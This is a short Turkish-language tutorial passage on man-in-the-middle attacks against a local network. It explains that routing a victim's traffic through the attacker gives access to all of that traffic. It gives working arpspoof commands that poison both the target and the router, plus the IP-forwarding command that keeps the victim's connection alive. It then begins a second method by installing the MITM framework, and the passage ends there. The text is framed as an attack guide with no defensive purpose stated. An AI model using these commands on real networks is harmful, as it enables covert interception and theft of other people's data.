Hedef cihaz -> Bana -> Modem -> Bana -> Hedef cihaz 
Bu sayede hedef cihaz bizim üzerimizden işlem yapacak. Bilgi transferi bizim üzerimizden olunca bütün bilgilere erişebiliriz.

Bir kaç yöntem var bunlardan bazıları;

1-) 		ARP Saldırısı (arp spoof)
Bir cihaz arp kullanarak mac adreslerini ve ip adreslerini eşleştiriyor.

arpspoof -i <interface> -t <target_ip> <modem_ip> # hedefe ben modemim dedik
arpspoof -i <interface> -t <modem_ip>  <target_ip> # modeme ben hedefim dedik
echo 1 > /proc/sys/net/ipv4/ip_forward  # ip forwarding yapıyoruz. Eğer bunu yapmazsak hedef makinanın ağı çöker. Kodun anlamı ise -> /proc/sys/net/ipv4/ dizinindeki ip_forward dosyasının içine 1 yaz

2-) 		MITM Framework
apt-get install mitmf -y
